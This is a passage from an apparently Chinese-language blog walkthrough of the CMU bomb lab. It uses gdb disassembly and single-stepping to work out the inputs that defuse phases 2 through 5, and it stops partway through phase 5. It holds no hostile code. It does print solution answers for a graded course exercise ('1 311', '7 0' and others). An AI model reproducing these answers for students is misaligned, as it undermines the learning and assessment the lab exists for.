0x0000000000400f41 &lt;+69&gt;:	pop    %rbp</div><div class="line">   0x0000000000400f42 &lt;+70&gt;:	retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>从函数<code>read_six_numbers</code>不难看出phase_2需要输入六个数字，存放于栈帧的前六个32位字中，之后程序运行分为下面几个步骤：</p>
<ol>
<li>从<code>cmpl $0x1,(%rsp)</code>中看出第一个输入的数字是1，若不为1，会跳转到<code>explode_bomb</code>函数产生爆炸；</li>
<li>程序依次运行到<code>&lt;+52&gt;:</code>，执行指令<code>lea 0x4(%rsp),%rbx</code>把第二个参数的地址传给rbx寄存器，指令<code>lea 0x18(%rsp),%rbp</code>把最后一个参数的下一位地址传给rbp寄存器；</li>
<li>之后程序运行到<code>jmp 0x400f17 &lt;phase_2+27&gt;</code>，跳转回<code>&lt;+27&gt;</code>开始进行新的运算；</li>
<li>函数段<code>&lt;+27&gt;</code>到<code>&lt;+32&gt;</code>将上一个参数乘以2与下一个参数比较，若不等则产生爆炸；</li>
<li>函数段<code>&lt;+41&gt;</code>到<code>&lt;+48&gt;</code>判断六个参数是否全部读完，若读完则函数返回，否则跳转回第四步继续执行；</li>
<li>若前五步没有产生爆炸，那么这一关成功通过。</li>
</ol>
<p>由上述分析可以看出，我们只要输入一个以1开始，之后参数每次乘2的六个参数即可，也就是<code>1 2 4 8 16 32</code><br>第二关phase_2通关结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line">which to blow yourself up. Have a nice day!</div><div class="line">Border relations with Canada have never been better.</div><div class="line">Phase 1 defused. How about the next one?</div><div class="line">1 2 4 8 16 32</div><div class="line">That&apos;s number 2.  Keep going!</div></pre></td></tr></table></figure></p>
<h2 id="第三关：phase-3"><a href="#第三关：phase-3" class="headerlink" title="第三关：phase_3"></a>第三关：phase_3</h2><p>使用disas查看<code>phase_3</code>函数的反汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function phase_3:</div><div class="line">   0x0000000000400f43 &lt;+0&gt;:	sub    $0x18,%rsp</div><div class="line">   0x0000000000400f47 &lt;+4&gt;:	lea    0xc(%rsp),%rcx</div><div class="line">   0x0000000000400f4c &lt;+9&gt;:	lea    0x8(%rsp),%rdx</div><div class="line">   0x0000000000400f51 &lt;+14&gt;:	mov    $0x4025cf,%esi</div><div class="line">   0x0000000000400f56 &lt;+19&gt;:	mov    $0x0,%eax</div><div class="line">   0x0000000000400f5b &lt;+24&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</div><div class="line">   0x0000000000400f60 &lt;+29&gt;:	cmp    $0x1,%eax</div><div class="line">   0x0000000000400f63 &lt;+32&gt;:	jg     0x400f6a &lt;phase_3+39&gt;</div><div class="line">   0x0000000000400f65 &lt;+34&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x0000000000400f6a &lt;+39&gt;:	cmpl   $0x7,0x8(%rsp)</div><div class="line">   0x0000000000400f6f &lt;+44&gt;:	ja     0x400fad &lt;phase_3+106&gt;</div><div class="line">   0x0000000000400f71 &lt;+46&gt;:	mov    0x8(%rsp),%eax</div><div class="line">   0x0000000000400f75 &lt;+50&gt;:	jmpq   *0x402470(,%rax,8)</div><div class="line">   0x0000000000400f7c &lt;+57&gt;:	mov    $0xcf,%eax</div><div class="line">   0x0000000000400f81 &lt;+62&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</div><div class="line">   0x0000000000400f83 &lt;+64&gt;:	mov    $0x2c3,%eax</div><div class="line">   0x0000000000400f88 &lt;+69&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</div><div class="line">   0x0000000000400f8a &lt;+71&gt;:	mov    $0x100,%eax</div><div class="line">   0x0000000000400f8f &lt;+76&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</div><div class="line">   0x0000000000400f91 &lt;+78&gt;:	mov    $0x185,%eax</div><div class="line">   0x0000000000400f96 &lt;+83&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</div><div class="line">   0x0000000000400f98 &lt;+85&gt;:	mov    $0xce,%eax</div><div class="line">   0x0000000000400f9d &lt;+90&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</div><div class="line">   0x0000000000400f9f &lt;+92&gt;:	mov    $0x2aa,%eax</div><div class="line">   0x0000000000400fa4 &lt;+97&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</div><div class="line">   0x0000000000400fa6 &lt;+99&gt;:	mov    $0x147,%eax</div><div class="line">   0x0000000000400fab &lt;+104&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</div><div class="line">   0x0000000000400fad &lt;+106&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x0000000000400fb2 &lt;+111&gt;:	mov    $0x0,%eax</div><div class="line">   0x0000000000400fb7 &lt;+116&gt;:	jmp    0x400fbe &lt;phase_3+123&gt;</div><div class="line">   0x0000000000400fb9 &lt;+118&gt;:	mov    $0x137,%eax</div><div class="line">   0x0000000000400fbe &lt;+123&gt;:	cmp    0xc(%rsp),%eax</div><div class="line">   0x0000000000400fc2 &lt;+127&gt;:	je     0x400fc9 &lt;phase_3+134&gt;</div><div class="line">   0x0000000000400fc4 &lt;+129&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x0000000000400fc9 &lt;+134&gt;:	add    $0x18,%rsp</div><div class="line">   0x0000000000400fcd &lt;+138&gt;:	retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>这个代码有点长，我们一步步来看。指令<code>&lt;+14&gt;</code>将一个立即数传给了esi寄存器，接下来就调用了<code>sscanf</code>函数，所以我们可以使用<code>x/s</code>查看$0x4025cf这个地址上的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x/s 0x4025cf</div><div class="line">0x4025cf:	&quot;%d %d&quot;</div></pre></td></tr></table></figure></p>
<p>可以看出这一关需要输入两个整数。可是之后就没有头绪了，我们可以在gdb中调试运行，查看各阶段寄存器的值，来判断这一关该怎样通过。<br>首先在phase_3位置设置断点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) break phase_3</div><div class="line">Breakpoint 1 at 0x400f43</div></pre></td></tr></table></figure></p>
<p>之后运行<code>run</code>，依次输入头两关的正确答案，到第三关时，通过上述的分析，我们先随便输入两个整数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(gdb) run</div><div class="line">Starting program: /mnt/c/Users/xzjqx/Desktop/Study/计算机系统/CMU实验_2018/bomblab/bomb/bomb </div><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line">which to blow yourself up. Have a nice day!</div><div class="line">Border relations with Canada have never been better.</div><div class="line">Phase 1 defused. How about the next one?</div><div class="line">1 2 4 8 16 32</div><div class="line">That&apos;s number 2.  Keep going!</div><div class="line">1 2</div><div class="line"></div><div class="line">Breakpoint 1, 0x0000000000400f43 in phase_3 ()</div></pre></td></tr></table></figure></p>
<p>之后使用<code>disas</code>指令可以查看断点后的一部分汇编代码，就是phase_3函数的反汇编代码。<br>使用<code>stepi</code>指令可以单步调试，由于我们已经不需要知道<code>&lt;__isoc99_sscanf@plt&gt;</code>函数的内容，我们直接在<code>0x0000000000400f60 &lt;+29&gt;:</code>处设置断点，再<code>continue</code>即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">(gdb) break *0x400f60</div><div class="line">Breakpoint 2 at 0x400f60</div><div class="line">(gdb) continue</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 2, 0x0000000000400f60 in phase_3 ()</div></pre></td></tr></table></figure></p>
<p>此时我们查看后续代码可以知道主要使用的(rsp+0x8)和(rsp+0xc)地址的数据，可以怀疑这里存的就是第三关输入的两个数。使用下面的一系列指令查看这两个位置的值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">(gdb) print &amp;rsp</div><div class="line">No symbol &quot;rsp&quot; in current context.</div><div class="line">(gdb) print $rsp</div><div class="line">$1 = (void *) 0x7fffffffdd10</div><div class="line">(gdb) x/2wd 0x7fffffffdd18</div><div class="line">0x7fffffffdd18:	1	2</div></pre></td></tr></table></figure></p>
<p>可以看出我们的猜测是正确的。接下来单步运行，从以下几条指令可以看出，输入的第一个数必须小于7。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x0000000000400f6a &lt;+39&gt;:	cmpl   $0x7,0x8(%rsp)</div><div class="line">0x0000000000400f6f &lt;+44&gt;:	ja     0x400fad &lt;phase_3+106&gt;</div><div class="line">...</div><div class="line">0x0000000000400fad &lt;+106&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div></pre></td></tr></table></figure></p>
<p>继续单步运行，由于我第一个数输入的是一，<code>&lt;+50&gt;:    jmpq   *0x402470(,%rax,8)</code>这条指令使程序运行到了<code>&lt;+118&gt;</code>，从下面的汇编代码可以看出，输入的第二个数必须等于0x137(也就是311)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">=&gt; 0x0000000000400fb9 &lt;+118&gt;:	mov    $0x137,%eax</div><div class="line">   0x0000000000400fbe &lt;+123&gt;:	cmp    0xc(%rsp),%eax</div><div class="line">   0x0000000000400fc2 &lt;+127&gt;:	je     0x400fc9 &lt;phase_3+134&gt;</div><div class="line">   0x0000000000400fc4 &lt;+129&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x0000000000400fc9 &lt;+134&gt;:	add    $0x18,%rsp</div></pre></td></tr></table></figure></p>
<p>所以我们就得到了一个答案<code>1 311</code>，重新运行<code>bomb</code>，得到结果如下，表示第三关通过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line">which to blow yourself up. Have a nice day!</div><div class="line">Border relations with Canada have never been better.</div><div class="line">Phase 1 defused. How about the next one?</div><div class="line">1 2 4 8 16 32</div><div class="line">That&apos;s number 2.  Keep going!</div><div class="line">1 311</div><div class="line">Halfway there!</div></pre></td></tr></table></figure></p>
<p>这一关应该还有很多答案，我这是通过单步调试找出来的答案，其实仔细回头看<code>phase_3</code>函数，可以发现指令<code>&lt;+46&gt;</code>到<code>&lt;+104&gt;</code>类似于C++中的switch结构，分别第一个输入数的对应八种情况，表示当第一个输入数为<code>0，1，2，3，4，5，6，7</code>时，第二个输入数应该分别为<code>207，311，707，256，389，206，682，327</code></p>
<h2 id="第四关：phase-4"><a href="#第四关：phase-4" class="headerlink" title="第四关：phase_4"></a>第四关：phase_4</h2><p>使用disas查看<code>phase_4</code>函数的反汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function phase_4:</div><div class="line">   0x000000000040100c &lt;+0&gt;:	sub    $0x18,%rsp</div><div class="line">   0x0000000000401010 &lt;+4&gt;:	lea    0xc(%rsp),%rcx</div><div class="line">   0x0000000000401015 &lt;+9&gt;:	lea    0x8(%rsp),%rdx</div><div class="line">   0x000000000040101a &lt;+14&gt;:	mov    $0x4025cf,%esi</div><div class="line">   0x000000000040101f &lt;+19&gt;:	mov    $0x0,%eax</div><div class="line">   0x0000000000401024 &lt;+24&gt;:	callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</div><div class="line">   0x0000000000401029 &lt;+29&gt;:	cmp    $0x2,%eax</div><div class="line">   0x000000000040102c &lt;+32&gt;:	jne    0x401035 &lt;phase_4+41&gt;</div><div class="line">   0x000000000040102e &lt;+34&gt;:	cmpl   $0xe,0x8(%rsp)</div><div class="line">   0x0000000000401033 &lt;+39&gt;:	jbe    0x40103a &lt;phase_4+46&gt;</div><div class="line">   0x0000000000401035 &lt;+41&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x000000000040103a &lt;+46&gt;:	mov    $0xe,%edx</div><div class="line">   0x000000000040103f &lt;+51&gt;:	mov    $0x0,%esi</div><div class="line">   0x0000000000401044 &lt;+56&gt;:	mov    0x8(%rsp),%edi</div><div class="line">   0x0000000000401048 &lt;+60&gt;:	callq  0x400fce &lt;func4&gt;</div><div class="line">   0x000000000040104d &lt;+65&gt;:	test   %eax,%eax</div><div class="line">   0x000000000040104f &lt;+67&gt;:	jne    0x401058 &lt;phase_4+76&gt;</div><div class="line">   0x0000000000401051 &lt;+69&gt;:	cmpl   $0x0,0xc(%rsp)</div><div class="line">   0x0000000000401056 &lt;+74&gt;:	je     0x40105d &lt;phase_4+81&gt;</div><div class="line">   0x0000000000401058 &lt;+76&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x000000000040105d &lt;+81&gt;:	add    $0x18,%rsp</div><div class="line">   0x0000000000401061 &lt;+85&gt;:	retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>这一关输入部分很像第三关，同样是输入两个整数。但是第四关主要的运算过程在一个新的函数<code>func4</code>中，使用disas查看这个的反汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function func4:</div><div class="line">   0x0000000000400fce &lt;+0&gt;:	sub    $0x8,%rsp</div><div class="line">   0x0000000000400fd2 &lt;+4&gt;:	mov    %edx,%eax</div><div class="line">   0x0000000000400fd4 &lt;+6&gt;:	sub    %esi,%eax</div><div class="line">   0x0000000000400fd6 &lt;+8&gt;:	mov    %eax,%ecx</div><div class="line">   0x0000000000400fd8 &lt;+10&gt;:	shr    $0x1f,%ecx</div><div class="line">   0x0000000000400fdb &lt;+13&gt;:	add    %ecx,%eax</div><div class="line">   0x0000000000400fdd &lt;+15&gt;:	sar    %eax</div><div class="line">   0x0000000000400fdf &lt;+17&gt;:	lea    (%rax,%rsi,1),%ecx</div><div class="line">   0x0000000000400fe2 &lt;+20&gt;:	cmp    %edi,%ecx</div><div class="line">   0x0000000000400fe4 &lt;+22&gt;:	jle    0x400ff2 &lt;func4+36&gt;</div><div class="line">   0x0000000000400fe6 &lt;+24&gt;:	lea    -0x1(%rcx),%edx</div><div class="line">   0x0000000000400fe9 &lt;+27&gt;:	callq  0x400fce &lt;func4&gt;</div><div class="line">   0x0000000000400fee &lt;+32&gt;:	add    %eax,%eax</div><div class="line">   0x0000000000400ff0 &lt;+34&gt;:	jmp    0x401007 &lt;func4+57&gt;</div><div class="line">   0x0000000000400ff2 &lt;+36&gt;:	mov    $0x0,%eax</div><div class="line">   0x0000000000400ff7 &lt;+41&gt;:	cmp    %edi,%ecx</div><div class="line">   0x0000000000400ff9 &lt;+43&gt;:	jge    0x401007 &lt;func4+57&gt;</div><div class="line">   0x0000000000400ffb &lt;+45&gt;:	lea    0x1(%rcx),%esi</div><div class="line">   0x0000000000400ffe &lt;+48&gt;:	callq  0x400fce &lt;func4&gt;</div><div class="line">   0x0000000000401003 &lt;+53&gt;:	lea    0x1(%rax,%rax,1),%eax</div><div class="line">   0x0000000000401007 &lt;+57&gt;:	add    $0x8,%rsp</div><div class="line">   0x000000000040100b &lt;+61&gt;:	retq   </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>从反汇编代码中看出函数自己调用了自己，应该是一个递归函数，但是查看下列反汇编代码，发现好像可以投机不需要进入递归，就能安全完成这个函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0x0000000000400fe2 &lt;+20&gt;:	cmp    %edi,%ecx</div><div class="line">0x0000000000400fe4 &lt;+22&gt;:	jle    0x400ff2 &lt;func4+36&gt;</div><div class="line">...</div><div class="line">0x0000000000400ff2 &lt;+36&gt;:	mov    $0x0,%eax</div><div class="line">0x0000000000400ff7 &lt;+41&gt;:	cmp    %edi,%ecx</div><div class="line">0x0000000000400ff9 &lt;+43&gt;:	jge    0x401007 &lt;func4+57&gt;</div><div class="line">...</div><div class="line">0x0000000000401007 &lt;+57&gt;:	add    $0x8,%rsp</div><div class="line">0x000000000040100b &lt;+61&gt;:	retq</div></pre></td></tr></table></figure></p>
<p>这一段代码的意思其实就是，如果%ecx==%edi，就直接返回phase_4，通过分析func4函数前面的赋值过程，可以很容易知道edi寄存器存的是输入的第一个整数，ecx寄存器得出的值0xe除以2，也就是7，所以我们就确定了第一个输入的整数应该为7。<br>再回到<code>phase_4</code>的最后一部分代码，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x0000000000401051 &lt;+69&gt;:	cmpl   $0x0,0xc(%rsp)</div><div class="line">0x0000000000401056 &lt;+74&gt;:	je     0x40105d &lt;phase_4+81&gt;</div><div class="line">0x0000000000401058 &lt;+76&gt;:	callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">0x000000000040105d &lt;+81&gt;:	add    $0x18,%rsp</div><div class="line">0x0000000000401061 &lt;+85&gt;:	retq</div></pre></td></tr></table></figure></p>
<p>可以看出第二个输入数应该为0，所以<code>phase_4</code>的一个答案为<code>7 0</code>，由于我没有具体查看递归函数<code>func</code>，所以应该还有其他正确答案可以通关。第四关通关结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line">which to blow yourself up. Have a nice day!</div><div class="line">Border relations with Canada have never been better.</div><div class="line">Phase 1 defused. How about the next one?</div><div class="line">1 2 4 8 16 32</div><div class="line">That&apos;s number 2.  Keep going!</div><div class="line">1 311</div><div class="line">Halfway there!</div><div class="line">7 0</div><div class="line">So you got that one.  Try this one.</div></pre></td></tr></table></figure></p>
<h2 id="第五关：phase-5"><a href="#第五关：phase-5" class="headerlink" title="第五关：phase_5"></a>第五关：phase_5</h2><p>使用disas查看<code>phase_5</code>函数的反汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function phase_5:</div><div class="line">   0x0000000000401062 &lt;+0&gt;:     push   %rbx</div><div class="line">   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp</div><div class="line">   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx</div><div class="line">   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax</div><div class="line">   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)</div><div class="line">   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax</div><div class="line">   0x000000000040107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt;</div><div class="line">   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax</div><div class="line">   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;</div><div class="line">   0x0000000000401084 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;</div><div class="line">   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx</div><div class="line">   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)</div><div class="line">   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx</div><div class="line">   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx</div><div class="line">   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx</div><div class="line">   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)</div><div class="line">   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax</div><div class="line">   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax</div><div class="line">   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;</div><div class="line">   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)</div><div class="line">   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi</div><div class="line">   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi</div><div class="line">   0x00000000004010bd &lt;+91&gt;:    callq  0x401338 &lt;strings_not_equal&gt;</div><div class="line">   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax</div><div class="line">   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;</div><div class="line">   0x00000000004010c6 &lt;+100&gt;:   callq  0x40143a &lt;explode_bomb&gt;</div><div class="line">   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)</div><div class="line">   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;</div><div class="line">   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax</div><div class="line">   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;</div><div class="line">   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax</div><div class="line">   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax</div><div class="line">   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;</div><div class="line">   0x00000000004010e9 &lt;+135&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</div><div class="line">   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp</div><div class="line">   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx</div><div class="line">   0x00000000004010f3 &lt;+145&gt;:   retq</div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>从下面一段代码可以看出，这一关的输入应该是一个长为6的字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x000000000040107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt;</div><div class="line">0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax</div><div class="line">0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;</div><div class="line">0x0000000000401084 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</div></pre></td></tr></table></figure></p>
<p>这样我们就可以先随便输入一个字符串：<code>abcdef</code>，方便后面单步调试运行：<br>首先设置断点<code>phase_5</code>，在运行<code>run</code>，输入前四关的正确答案和第五关的<code>abcdef</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">(gdb) break phase_5</div><div class="line">Breakpoint 1 at 0x401062</div><div class="line">(gdb) run</div><div class="line">Starting program: /mnt/c/Users/xzjqx/Desktop/Study/计算机系统/CMU实验_2018/bomblab/bomb/bomb</div><div class="line">Welcome to my fiendish little bomb. You have 6 phases with</div><div class="line">which to blow yourself up. Have a nice day!</div><div class="line">Border relations with Canada have never been better.</div><div class="line">Phase 1 defused. How about the next one?</div><div class="line">1 2 4 8 16 32</div><div class="line">That&apos;s number 2.  Keep going!</div><div class="line">1 311</div><div class="line">Halfway there!</div><div class="line">7 0</div><div class="line">So you got that one.  Try this one.</div><div class="line">abcdef</div><div class="line"></div><div class="line">Breakpoint 1, 0x0000000000401062 in phase_5 ()</div></pre></td></tr></table></figure></p>
<p>之后的代码中，下面这一段是一个loop：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx</div><div class="line">0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)</div><div class="line">0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx</div><div class="line">0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx</div><div class="line">0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx</div><div class="line">0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)</div><div class="line">0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax</div><div class="line">0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax</div><div class="line">0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;</div></pre></td></tr></table></figure></p>
<p>我们在<code>0x40108b</code>处设置断点，然后输入<code>continue</code>继续运行程序，再单步运行，并查看寄存器的值，全部操作如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">(gdb) print $rbx</div><div class="line">$1 = 6305984</div><div class="line">(gdb) print $rax</div><div class="line">$2 = 0</div><div class="line">(gdb) stepi</div><div class="line">0x000000000040108f in phase_5 ()</div><div class="line">(gdb) print $ecx</div><div class="line">$3 = 97</div><div class="line">(gdb) print $cl</div><div class="line">$4 = 97</div><div class="line">(gdb) stepi</div><div class="line">0x0000000000401092 in phase_5 ()</div><div class="line">(gdb) stepi</div><div class="line">0x0000000000401096 in phase_5 ()</div><div class="line">(gdb) print $rdx</div><div class="line">$5 = 4203105</div><div class="line">(gdb) stepi</div><div class="line">0x0000000000401099 in phase_5 